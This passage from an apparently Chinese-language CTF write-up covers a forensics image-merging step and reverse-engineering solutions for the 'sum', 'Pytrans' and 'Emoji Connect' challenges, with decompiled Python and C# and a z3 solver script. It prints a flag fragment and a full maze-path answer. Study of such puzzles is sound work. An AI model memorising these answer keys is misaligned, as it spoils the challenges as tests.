class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">import</span> os<br>d=os.listdir(<span class="hljs-string">&#x27;png&#x27;</span>)<br>d.sort(key=<span class="hljs-keyword">lambda</span> n:<span class="hljs-built_in">int</span>(n[:-<span class="hljs-number">4</span>]))<br>i=Image.<span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;png&#x27;</span>,d[<span class="hljs-number">0</span>]))<br>w,h=i.size<br>im=Image.new(i.mode,(w,h*<span class="hljs-built_in">len</span>(d)))<br>i.close()<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">try</span>:<br>        fp=os.path.join(<span class="hljs-string">&#x27;png&#x27;</span>,v)<br>        im1=Image.<span class="hljs-built_in">open</span>(fp)<br>        im.paste(im1,(<span class="hljs-number">0</span>,i))<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>im.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>210-1.png</code>合并图片<br><img src="/img/blog_img/2023chunqiuspring/misc-happy2forensics-1.png" srcset="/img/loading.gif" lazyload alt=""><br>解压压缩包得到<code>flag2:-919c-a140d7054ac5</code></p><p><code>磁盘文件</code>合并图片<br><img src="/img/blog_img/2023chunqiuspring/misc-happy2forensics-2.png" srcset="/img/loading.gif" lazyload alt=""><br>看来<code>flag</code>并不在这里</p><p>使用<code>010</code>查看之前分离出来的<code>jpg</code>,发现存在两个<code>jpg</code>头,删除开始的<code>jpg</code>头之后得到一张新的图片<br><img src="/img/blog_img/2023chunqiuspring/misc-happy2forensics-3.jpg" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="REVERSE">REVERSE</h2><h3 id="sum">sum</h3><p>因为输入的数据会写入到一个9x9的二维数组中,同时二维数组的内容为0~9的数字,并且,输入的数据会替换掉二维数组中0所在的位置,所以我猜测是一个数独游戏,将<code>matrix</code>变量的内容导出来,作为一个<code>9x9</code>的方阵<br>将数字导入到这个<a href="https://www.dcode.fr/sudoku-solver">数独</a>网站之后就可以获得数独中需要填入的内容了<br><img src="/img/blog_img/2023chunqiuspring/reverse-sum.png" srcset="/img/loading.gif" lazyload alt=""></p><h3 id="Pytrans">Pytrans</h3><p>先使用<code>pyinstxtractor</code>将<code>exe</code>解包,然后使用<a href="https://tool.lu/pyc">在线pyc反编译网站</a>,将解包之后得到的<code>run.pyc</code>反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 3.9</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-comment"># WARNING: Decompyle incomplete</span><br></code></pre></td></tr></table></figure><p>反编译失败,不过我们可以通过<code>run.pyc</code>中的字符串内容,来推测实际代码<br><img src="/img/blog_img/2023chunqiuspring/reverse-Pytrans.png" srcset="/img/loading.gif" lazyload alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">猜测的run.py代码</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> ctypes<br>dll=CDLL(<span class="hljs-string">&#x27;./mylib.so&#x27;</span>)<br>data=<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please enter the 10 digits and ending with &#x27;\n&#x27;:&quot;</span>).split()])<br>data_p=dll.check(data)<br>data=base64.b64decode(ctypes.c_char_p(data_p).value)<br>data=zlib.decompress(data)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">剩下的不太确定了,不过可以确定的是data的内容后面是要被执行的</span><br><span class="hljs-string">所以我们需要先获取data的值</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/2023chunqiuspring/reverse-Pytrans-1.png" srcset="/img/loading.gif" lazyload alt=""><br>在<code>mylib.so</code>中的<code>check</code>函数的开头存在这段代码,使用python的z3模块解方程得到数据内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> z3<br>s=z3.Solver()<br>a1 =z3.Int(<span class="hljs-string">&quot;a1&quot;</span>)<br>a11=z3.Int(<span class="hljs-string">&quot;a11&quot;</span>)<br>a12=z3.Int(<span class="hljs-string">&quot;a12&quot;</span>)<br>a13=z3.Int(<span class="hljs-string">&quot;a13&quot;</span>)<br>a14=z3.Int(<span class="hljs-string">&quot;a14&quot;</span>)<br>a15=z3.Int(<span class="hljs-string">&quot;a15&quot;</span>)<br>a16=z3.Int(<span class="hljs-string">&quot;a16&quot;</span>)<br>a17=z3.Int(<span class="hljs-string">&quot;a17&quot;</span>)<br>a18=z3.Int(<span class="hljs-string">&quot;a18&quot;</span>)<br>a19=z3.Int(<span class="hljs-string">&quot;a19&quot;</span>)<br><br>a=[]<br>a.append(a1 )<br>a.append(a11)<br>a.append(a12)<br>a.append(a13)<br>a.append(a14)<br>a.append(a15)<br>a.append(a16)<br>a.append(a17)<br>a.append(a18)<br>a.append(a19)<br><br>s.insert(-<span class="hljs-number">27</span> * a17 + -<span class="hljs-number">11</span> * a16 + <span class="hljs-number">16</span> * a15 + a1 + <span class="hljs-number">2</span> * a11 - a12 + <span class="hljs-number">8</span> * a13 - <span class="hljs-number">14</span> * a14 + <span class="hljs-number">26</span> * a18 + <span class="hljs-number">17</span> * a19 == <span class="hljs-number">14462</span> )<br>s.insert(-<span class="hljs-number">30</span> * a18 + <span class="hljs-number">13</span> * a15 + a13 + a11 + <span class="hljs-number">2</span> * a1 - <span class="hljs-number">15</span> * a14 - <span class="hljs-number">24</span> * a16 + <span class="hljs-number">16</span> * a17 + <span class="hljs-number">36</span> * a19 == -<span class="hljs-number">2591</span> )<br>s.insert(<span class="hljs-number">16</span> * a16 + -<span class="hljs-number">21</span> * a15 + <span class="hljs-number">7</span> * a13 + <span class="hljs-number">3</span> * a11 - a1 - a12 + <span class="hljs-number">12</span> * a14 - <span class="hljs-number">23</span> * a17 + <span class="hljs-number">25</span> * a18 - <span class="hljs-number">18</span> * a19 == <span class="hljs-number">2517</span> )<br>s.insert(-<span class="hljs-number">6</span> * a16 + <span class="hljs-number">2</span> * a12 - a11 + <span class="hljs-number">2</span> * a15 + <span class="hljs-number">9</span> * a17 + <span class="hljs-number">2</span> * a18 - <span class="hljs-number">5</span> * a19 == <span class="hljs-number">203</span> )<br>s.insert(-<span class="hljs-number">5</span> * a18 + <span class="hljs-number">6</span> * a17 + <span class="hljs-number">3</span> * a11 - a13 - a15 + a16 + <span class="hljs-number">5</span> * a19 == <span class="hljs-number">3547</span> )<br>s.insert(-<span class="hljs-number">9</span> * a18 + a14 + a12 + a17 - <span class="hljs-number">5</span> * a19 == -<span class="hljs-number">7609</span> )<br>s.insert(<span class="hljs-number">2</span> * a15 + -a13 - a14 + a18 + <span class="hljs-number">6</span> * a19 == <span class="hljs-number">4884</span> )<br>s.insert(a16 - a17 + <span class="hljs-number">2</span> * a18 == <span class="hljs-number">1618</span> )<br>s.insert(a14 - a16 + <span class="hljs-number">2</span> * a19 == <span class="hljs-number">1096</span> )<br>s.insert(a18 + a14 + a13 + a12 + a11 + a1 - a15 - a16 - a17 - a19 == <span class="hljs-number">711</span> )<br>s.insert(<span class="hljs-number">2</span> * (<span class="hljs-number">2</span> * a14 + a13) + <span class="hljs-number">5</span> * a15 == <span class="hljs-number">7151</span> )<br>s.check()<br>res=s.model()<br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e.append(res[i])<br><span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> ctypes<br>dll=ctypes.CDLL(<span class="hljs-string">&quot;./mylib.so&quot;</span>)<br>data=<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(i.as_long()) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e])<br>data_p=dll.check(data)<br>data=base64.b64decode(ctypes.c_char_p(data_p).value)<br>data=zlib.decompress(data)<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(data)<br>f.close()<br></code></pre></td></tr></table></figure><p>使用<code>010</code>查看导出的<code>data</code>文件,发现是<code>pyc</code>文件缺少了头,因为<code>exe</code>解包之后的<code>pyc</code>中大多数都是<code>python3.8</code>版本的<code>pyc</code>文件,所以将<code>3.8</code>版本的<code>pyc</code>头写入<code>data</code>文件之后,进行反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 3.8</span><br><br>footprint = <span class="hljs-string">&#x27;3qzqns4hj6\neeaxc!4a-%\nd735_@4l6g\nf1gd1v7hdm\n1+$-953&#125;81\na^21vbnm3!\n-#*f-e1d8_\n2ty9uipok-\n6r1802f7d1\n9wez1c-f&#123;0&#x27;</span><br>xx0000 = []<br>footprintlist = footprint.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(footprintlist)):<br>    xx0000.append(<span class="hljs-built_in">list</span>(footprintlist[i]))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xxxx000x0</span>(<span class="hljs-params">num</span>):<br>    xx000000 = <span class="hljs-built_in">format</span>(num, <span class="hljs-string">&#x27;010b&#x27;</span>)<br>    <span class="hljs-keyword">return</span> xx000000<br><br>oxooxxxxxoooo = []<br>xx0000000 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please enter the previous 10 digits again and ending with &#x27;\\n&#x27;: &quot;</span>).split(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(xx0000000) == <span class="hljs-number">10</span>:<br>    <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xx0000000:<br>            oxooxxxxxoooo.append(<span class="hljs-built_in">int</span>(i))<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;err input!&#x27;</span>)<br>    exit(-<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;err input!&#x27;</span>)<br>    exit(-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(oxooxxxxxoooo)):<br>        oxooxxxxxoooo[i] = <span class="hljs-built_in">list</span>(xxxx000x0(oxooxxxxxoooo[i]))<br>    xx0000x000 = oxooxxxxxoooo<br>    (x, o) = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    xx00x00x0xxx00 = [<br>        (x, o)]<br>    xx00x00x0xxx00input = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;input maze path:&#x27;</span>))<br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> (x, o) != (<span class="hljs-number">9</span>, <span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">if</span> count &lt; <span class="hljs-built_in">len</span>(xx00x00x0xxx00input):<br>            xx0000x0xxx00 = xx00x00x0xxx00input[count]<br>            <span class="hljs-keyword">if</span> xx0000x0xxx00 == <span class="hljs-string">&#x27;a&#x27;</span>:<br>                <span class="hljs-keyword">if</span> o &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> xx0000x000[x][o - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;0&#x27;</span>:<br>                    o -= <span class="hljs-number">1</span><br>                    count += <span class="hljs-number">1</span><br>                    xx00x00x0xxx00.append((x, o))<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong!&#x27;</span>)<br>                    exit(-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">elif</span> xx0000x0xxx00 == <span class="hljs-string">&#x27;d&#x27;</span>:<br>                <span class="hljs-keyword">if</span> o &lt; <span class="hljs-number">9</span> <span class="hljs-keyword">and</span> xx0000x000[x][o + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;0&#x27;</span>:<br>                    count += <span class="hljs-number">1</span><br>                    o += <span class="hljs-number">1</span><br>                    xx00x00x0xxx00.append((x, o))<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong!&#x27;</span>)<br>                    exit(-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">elif</span> xx0000x0xxx00 == <span class="hljs-string">&#x27;w&#x27;</span>:<br>                <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> xx0000x000[x - <span class="hljs-number">1</span>][o] == <span class="hljs-string">&#x27;0&#x27;</span>:<br>                    count += <span class="hljs-number">1</span><br>                    x -= <span class="hljs-number">1</span><br>                    xx00x00x0xxx00.append((x, o))<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong!&#x27;</span>)<br>                    exit(-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">elif</span> xx0000x0xxx00 == <span class="hljs-string">&#x27;s&#x27;</span>:<br>                <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">9</span> <span class="hljs-keyword">and</span> xx0000x000[x + <span class="hljs-number">1</span>][o] == <span class="hljs-string">&#x27;0&#x27;</span>:<br>                    count += <span class="hljs-number">1</span><br>                    x += <span class="hljs-number">1</span><br>                    xx00x00x0xxx00.append((x, o))<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong!&#x27;</span>)<br>                    exit(-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong!&#x27;</span>)<br>                exit(-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong!&#x27;</span>)<br>        exit(-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">continue</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;right! you maybe got it,flag is flag&#123;the footprint of the maze path&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>发现将上面脚本中得到的e中的整数,转换为十位二进制之后可以得到一个迷宫,通过解迷宫之后输入可以得到flag<br>迷宫路径为<code>sddsdssdddwwwddsssssaaaaassddsddwdds</code></p><h3 id="Emoji-Connect">Emoji Connect</h3><p>执行解压之后得到的<code>.vsto</code>文件会在<code>excel</code>中安装<code>com程序</code>,之后创建一个新的表格,在<code>excel</code>的菜单栏中会出现一个<code>春秋GAME</code>,点击之后可以开启一个连连看游戏,这个<code>vsto</code>文件实际上是将<code>Emoji_Connect.dll</code>安装到<code>excel</code>中,不过我第一次安装成功了,但删除之后再安装菜单栏中就没有<code>春秋GAME</code>了<br><code>Emoji_Connect.dll</code>是一个<code>.net</code>程序,使用<code>dnspy</code>分析程序</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-comment">// Emoji_Connect.Game</span><br><span class="hljs-comment">// Token: 0x06000003 RID: 3 RVA: 0x0000AC44 File Offset: 0x00008E44</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">check</span>()</span><br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">48</span>; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">48</span>; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (Game.&lt;&gt;o__7.&lt;&gt;p__2 == <span class="hljs-literal">null</span>)<br>&#123;<br>Game.&lt;&gt;o__7.&lt;&gt;p__2 = CallSite&lt;Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">bool</span>&gt;&gt;.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, <span class="hljs-keyword">typeof</span>(Game), <span class="hljs-keyword">new</span> CSharpArgumentInfo[]<br>&#123;<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, <span class="hljs-literal">null</span>)<br>&#125;));<br>&#125;<br>Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">bool</span>&gt; target = Game.&lt;&gt;o__7.&lt;&gt;p__2.Target;<br>CallSite &lt;&gt;p__ = Game.&lt;&gt;o__7.&lt;&gt;p__2;<br><span class="hljs-keyword">if</span> (Game.&lt;&gt;o__7.&lt;&gt;p__1 == <span class="hljs-literal">null</span>)<br>&#123;<br>Game.&lt;&gt;o__7.&lt;&gt;p__1 = CallSite&lt;Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">string</span>, <span class="hljs-built_in">object</span>&gt;&gt;.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.NotEqual, <span class="hljs-keyword">typeof</span>(Game), <span class="hljs-keyword">new</span> CSharpArgumentInfo[]<br>&#123;<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, <span class="hljs-literal">null</span>),<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, <span class="hljs-literal">null</span>)<br>&#125;));<br>&#125;<br>Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">string</span>, <span class="hljs-built_in">object</span>&gt; target2 = Game.&lt;&gt;o__7.&lt;&gt;p__1.Target;<br>CallSite &lt;&gt;p__2 = Game.&lt;&gt;o__7.&lt;&gt;p__1;<br><span class="hljs-keyword">if</span> (Game.&lt;&gt;o__7.&lt;&gt;p__0 == <span class="hljs-literal">null</span>)<br>&#123;<br>Game.&lt;&gt;o__7.&lt;&gt;p__0 = CallSite&lt;Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">object</span>&gt;&gt;.Create(Binder.GetMember(CSharpBinderFlags.None, <span class="hljs-string">&quot;Value&quot;</span>, <span class="hljs-keyword">typeof</span>(Game), <span class="hljs-keyword">new</span> CSharpArgumentInfo[]<br>&#123;<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, <span class="hljs-literal">null</span>)<br>&#125;));<br>&#125;<br><span class="hljs-keyword">if</span> (target(&lt;&gt;p__, target2(&lt;&gt;p__2, Game.&lt;&gt;o__7.&lt;&gt;p__0.Target(Game.&lt;&gt;o__7.&lt;&gt;p__0, <span class="hljs-keyword">this</span>.sheet1.Cells[i + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>]), <span class="hljs-string">&quot;\ud83d\udca5&quot;</span>)))<br>&#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br>&#125;<br>MessageBox.Show(Encoding.ASCII.GetString((<span class="hljs-keyword">from</span> n <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span>.<span class="hljs-function">number</span><br><span class="hljs-function"><span class="hljs-title">select</span> (<span class="hljs-params"><span class="hljs-built_in">byte</span></span>)n).<span class="hljs-title">ToArray</span>&lt;<span class="hljs-title">byte</span>&gt;()))</span>;<br>&#125; <span class="hljs-comment">// 发现有一个number成员最后会作为flag显示</span><br><br><span class="hljs-keyword">this</span>.number = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>[]<br>&#123;<span class="hljs-number">25588</span>,<span class="hljs-number">31114</span>,<span class="hljs-number">28727</span>,<span class="hljs-number">26722</span>,<span class="hljs-number">24948</span>,<span class="hljs-number">25135</span>,<span class="hljs-number">25480</span>,<span class="hljs-number">29029</span>,<span class="hljs-number">23025</span>,<span class="hljs-number">25775</span>,<span class="hljs-number">15411</span>,<span class="hljs-number">25423</span>,<span class="hljs-number">25202</span>,<span class="hljs-number">30031</span>,<span class="hljs-number">27380</span>,<span class="hljs-number">30734</span>,<span class="hljs-number">25054</span>,<span class="hljs-number">25109</span>,<span class="hljs-number">20741</span>,<span class="hljs-number">28568</span>,<span class="hljs-number">28802</span>,<span class="hljs-number">24591</span>,<span class="hljs-number">26063</span>,<span class="hljs-number">30940</span>,<span class="hljs-number">30375</span>,<span class="hljs-number">19411</span>,<span class="hljs-number">29573</span>,<span class="hljs-number">20845</span>,<span class="hljs-number">27232</span>,<span class="hljs-number">26743</span>,<span class="hljs-number">25779</span>,<span class="hljs-number">24986</span>,<span class="hljs-number">31498</span>,<span class="hljs-number">30978</span>,<span class="hljs-number">22945</span>,<span class="hljs-number">26563</span>,<span class="hljs-number">35012</span>,<span class="hljs-number">29994</span>,<span class="hljs-number">27016</span>,<span class="hljs-number">29535</span>,<span class="hljs-number">21342</span>,<span class="hljs-number">26573</span>,<span class="hljs-number">27569</span>,<span class="hljs-number">25408</span>,<span class="hljs-number">31567</span>,<span class="hljs-number">25503</span>,<span class="hljs-number">21385</span>,<span class="hljs-number">27207</span>&#125;; <span class="hljs-comment">//number的初始值</span><br><br><span class="hljs-comment">// Emoji_Connect.Game</span><br><span class="hljs-comment">// Token: 0x06000002 RID: 2 RVA: 0x0000A5B0 File Offset: 0x000087B0</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Select_Unit</span>(<span class="hljs-params">Microsoft.Office.Interop.Excel.Range Target</span>)</span><br>&#123;<br>...<br><span class="hljs-keyword">if</span> (target(&lt;&gt;p__, arg5))<br>&#123;<br><span class="hljs-keyword">if</span> (Game.&lt;&gt;o__6.&lt;&gt;p__13 == <span class="hljs-literal">null</span>)<br>&#123;<br>Game.&lt;&gt;o__6.&lt;&gt;p__13 = CallSite&lt;Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">bool</span>&gt;&gt;.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, <span class="hljs-keyword">typeof</span>(Game), <span class="hljs-keyword">new</span> CSharpArgumentInfo[]<br>&#123;<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, <span class="hljs-literal">null</span>)<br>&#125;));<br>&#125;<br>Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">bool</span>&gt; target6 = Game.&lt;&gt;o__6.&lt;&gt;p__13.Target;<br>CallSite &lt;&gt;p__6 = Game.&lt;&gt;o__6.&lt;&gt;p__13;<br><span class="hljs-keyword">if</span> (Game.&lt;&gt;o__6.&lt;&gt;p__12 == <span class="hljs-literal">null</span>)<br>&#123;<br>Game.&lt;&gt;o__6.&lt;&gt;p__12 = CallSite&lt;Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">object</span>&gt;&gt;.Create(Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.Equal, <span class="hljs-keyword">typeof</span>(Game), <span class="hljs-keyword">new</span> CSharpArgumentInfo[]<br>&#123;<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, <span 